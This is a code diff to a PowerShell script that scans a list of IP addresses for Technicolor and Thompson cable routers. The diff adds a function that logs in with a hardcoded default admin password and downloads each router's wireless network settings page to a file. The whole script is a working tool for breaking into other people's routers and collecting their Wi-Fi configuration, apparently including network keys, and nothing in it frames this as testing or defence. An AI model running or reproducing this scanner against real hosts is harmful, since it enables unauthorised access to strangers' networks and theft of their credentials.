@@ -42,13 +42,24 @@ function setup(){
 	createDirectory $SAVE_FOLDER
 }
 
-function start(){
+#===================Routers=====================
+#Technicolor y Thompson que usan DOCSIS 2.0 
+function techTom($ip){
+	echo "$ip - Technicolor - Thompson" 
+	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
+	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
+    curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
+    curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
+    curl -o $save --connect-timeout 3 -m 60 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp;
+	verifyFile;
+}
+
+function runScanner(){
 	setup
 	foreach($line in Get-Content .\NATIp.txt) {
-		echo $line
 		$title = curl --connect-timeout 3 -m 10 -s -L $line | findstr -i title
 		if(![string]::IsNullOrEmpty($title)){
-			$save = $line+".txt"
+			$save = "$SAVE_FOLDER/$line.txt"
 			switch -regex ($title){
 				".*HTTP 401 - Unauthorized.*" {techTom $line; break}
 				
@@ -58,6 +69,6 @@ function start(){
 	}
 }
 
-start
+runScanner
 
 Read-Host -Prompt "Press Enter to exit"
